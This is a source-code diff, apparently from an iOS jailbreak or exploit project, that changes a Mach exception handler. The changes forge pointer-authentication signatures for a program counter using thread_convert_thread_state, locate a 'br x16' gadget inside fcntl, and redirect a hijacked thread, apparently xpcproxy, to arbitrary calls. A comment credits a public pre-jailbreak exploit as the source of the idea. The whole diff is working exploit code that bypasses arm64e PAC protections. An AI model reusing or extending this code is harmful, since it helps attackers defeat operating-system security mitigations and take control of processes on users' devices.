@@ -126,12 +126,12 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
                    "x20: 0x%016llx x21: 0x%016llx x22: 0x%016llx x23: 0x%016llx\n"
                    "x24: 0x%016llx x25: 0x%016llx x26: 0x%016llx x27: 0x%016llx\n"
                    "x28: 0x%016llx  fp: 0x%016llx  lr: 0x%016llx\n"
-                   " pc: 0x%016llx  sp: 0x%016llx psr: 0x%08x"
+                   " pc: 0x%016llx(0x%016llx)  sp: 0x%016llx psr: 0x%08x"
                    "\n",
                    old_state->__x[ 0], old_state->__x[ 1], old_state->__x[ 2], old_state->__x[ 3], old_state->__x[ 4], old_state->__x[ 5], old_state->__x[ 6], old_state->__x[ 7], old_state->__x[ 8], old_state->__x[ 9],
                    old_state->__x[10], old_state->__x[11], old_state->__x[12], old_state->__x[13], old_state->__x[14], old_state->__x[15], old_state->__x[16], old_state->__x[17], old_state->__x[18], old_state->__x[19],
                    old_state->__x[20], old_state->__x[21], old_state->__x[22], old_state->__x[23], old_state->__x[24], old_state->__x[25], old_state->__x[26], old_state->__x[27], old_state->__x[28],
-                   old_state->__opaque_fp, old_state->__opaque_lr, old_state->__opaque_pc, old_state->__opaque_sp, old_state->__cpsr);
+                   old_state->__opaque_fp, old_state->__opaque_lr, old_state->__opaque_pc, xpaci((uint64_t)old_state->__opaque_pc), old_state->__opaque_sp, old_state->__cpsr);
             return KERN_FAILURE;
         }
         #else
@@ -158,8 +158,51 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         }
         #endif
     }
-    
-    __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX16Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
+
+    // IDEA: https://github.com/pattern-f/TQ-pre-jailbreak/blob/main/exploit-main/post_exploit.c#L360
+    mach_port_t selfThread;
+    kern_return_t err;
+
+    err = thread_create(mach_task_self(), &thread);
+    if (err != KERN_SUCCESS) {
+        printf("thread_create failed: %d\n", err);
+        while(1) {};
+    }
+
+    arm_thread_state64_t state;
+    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
+    err = thread_get_state(mach_thread_self(), ARM_THREAD_STATE64, (thread_state_t)&state, &count);
+    if (err != KERN_SUCCESS) {
+        printf("thread_get_state failed: %d\n", err);
+        while(1) {};
+    }
+
+    brX16Address = ptrauth_sign_unauthenticated(brX16Address, ptrauth_key_asia, ptrauth_string_discriminator("pc"));
+#if __arm64e__
+    state.__opaque_pc = brX16Address;
+#endif
+
+    arm_thread_state64_t xpcproxy_state;
+    count = ARM_THREAD_STATE64_COUNT;
+    err = thread_convert_thread_state(thread, THREAD_CONVERT_THREAD_STATE_FROM_SELF, ARM_THREAD_STATE64,
+            (thread_state_t)&state, ARM_THREAD_STATE64_COUNT,
+            (thread_state_t)&xpcproxy_state, &count);
+    if (err != KERN_SUCCESS) {
+        printf("thread_convert_thread_state failed: %d\n", err);
+        while(1) {};
+    }
+    void *signed_pc;
+#if __arm64e__
+    signed_pc = xpcproxy_state.__opaque_pc;
+#endif
+
+    err = thread_terminate(thread);
+    if (err != KERN_SUCCESS) {
+        printf("thread_terminate failed: %d\n", err);
+        while(1) {};
+    }
+
+    __darwin_arm_thread_state64_set_pc_fptr(*new_state, signed_pc);
     //__darwin_arm_thread_state64_set_lr_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)0x41414100, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
     //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
     dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
@@ -204,18 +247,15 @@ mach_port_t setup_exception_server(void) {
     // find br x16
     uint32_t *func = ((uint32_t *)ptrauth_strip((void *)fcntl, ptrauth_key_function_pointer));
     for (; *func != 0xd61f0200;/* br x16 opcode */ func++) {}
-    brX16Address = (void *)ptrauth_sign_unauthenticated((void *)(func), ptrauth_key_function_pointer, 0);
+    func--;func--; //XXX TEMPORARY; -8 off
+    brX16Address = (void *)func;
     
     printf("INFO of br x16 address:\n");
     printf("Unsigned: 0x%16llx\n", (uint64_t)func);
-    printf("Signed:   0x%16llx\n", (uint64_t)brX16Address);
+    // printf("Signed:   0x%16llx\n", (uint64_t)brX16Address);
 
     // brX16Address will be first executed from xpcproxy
     // and then x16 will be pointed to arbitrary call, but x16 has some PAC issues maybe?
-    brX16Address = (void *)func;
-    printf("Signed2:  0x%16llx\n", (uint64_t)brX16Address);
-    // brX16Address = (void *)0xb62cd70206b89848;
-    // brX16Address = (void *)0x4142434445464748;
     
     mach_port_t server_port;
     kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
